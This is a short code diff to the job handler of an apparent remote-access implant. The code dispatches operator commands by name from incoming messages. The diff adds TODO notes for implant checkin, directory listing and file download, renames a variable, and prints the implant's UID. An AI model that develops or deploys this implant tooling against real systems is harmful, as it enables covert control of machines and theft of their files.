@@ -57,6 +57,11 @@ class Jobs:
         self.completed = []
         self.comms = comms
 
+    # TODO:
+    # checkin - orders all implants to send a checkin packet
+    # ls - lists a directory
+    # download - downloads a file
+
     def setSleep(self, cmdString):
         """ update the minimum and maximum sleep times
             cmdString format:
@@ -77,7 +82,7 @@ class Jobs:
         print("WE GOT A JOB TA DO")
 
         print(msg)
-        [jobId, jobName, cmdString] = msg
+        [jobId, jobType, cmdString] = msg
 
         # if we've already done this job, continue
         # otherwise mark it as done, then farm it out
@@ -87,14 +92,16 @@ class Jobs:
         else:
             self.completed.append(jobId)
 
-            # call the function with the name jobName
-            getattr(self, jobName)(cmdString)
+            # call the function with the name jobType
+            getattr(self, jobType)(cmdString)
             # TODO in a thread
 
 
 if __name__ == "__main__":
     # set up our comms channel
     comms = ImplantComms(channel, encoders, channelParams, encoderParams)
+
+    print("Our UID is: {}".format(comms.uid))
 
     # set up our jobs handler
     jobs = Jobs(comms)
